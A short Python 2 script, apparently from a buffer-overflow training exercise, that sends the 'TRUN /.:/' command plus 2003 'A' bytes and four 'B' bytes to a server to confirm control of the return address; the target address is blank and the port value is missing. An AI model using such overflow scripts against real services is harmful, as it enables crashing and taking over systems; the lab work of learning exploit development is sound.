#!/usr/bin/python
import sys, socket

ip = ''
port=
command = "TRUN /.:/"
shellcode = "A" * 2003 + "B" * 4

try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip,port))
        s.send((command + shellcode))
        s.close()

except:
        print "Error Connecting to Server"
        sys.exit()